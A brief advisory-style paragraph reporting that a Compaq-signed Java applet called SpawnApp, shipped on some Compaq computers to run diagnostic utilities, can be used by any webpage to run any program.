Some Compaq computers come with a Java applet called SpawnApp. This applet is used to run Compaq diagnostic utilities from the local hard drive when certain Compaq websites are viewed. The problem is that the applet can run any program, and can be used by any webpage. This applet is signed as secure by Compaq.
